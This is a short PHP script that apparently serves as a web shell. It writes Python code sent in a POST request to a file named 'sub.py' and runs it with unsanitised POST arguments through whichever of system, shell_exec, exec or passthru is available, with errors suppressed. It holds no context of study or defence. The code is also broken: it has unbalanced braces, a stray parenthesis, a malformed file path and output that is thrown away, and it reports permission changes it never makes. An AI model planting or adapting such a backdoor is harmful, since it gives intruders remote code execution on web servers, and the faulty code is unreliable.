<?php
function execute($code){
	$output = "";
	$code = $code." 2>&1";

	if(is_callable('system')){
		ob_start();
		@system($code);
		$output = ob_get_contents();
		ob_end_clean();	
	}
	elseif(is_callable('shell_exec')){
		$output = @shell_exec($code);
			
	elseif(is_callable('exec'))
		@exec($code,$res);
	
	elseif(is_callable('passthru')){
		ob_start();
		@passthru($code);
		$output = ob_get_contents();
		ob_end_clean();		
	}
	return $output;
}

$tmpdir = getcwd();
if(is_writable($tmpdir)){
	$path = $_GET['path'];
	$evalArguments = $_POST['args'];
	$filename = "sub.py";
	$evalCode = $_POST['code'];
	
	$path = $filename;
	@file_put_contents($tmpdir.$path, $evalCode))
	$res = "Temporary file : ".$path;
				
	$res .= " (ok)\n";
	$res .= "Setting permissions : 0755";
				
	$res .= " (ok)\n";
	$cmd = "python ".$path.$evalArguments;
	$res .= "Execute : ".$cmd."\n";
	$output = execute($cmd);				
}
die("");
?>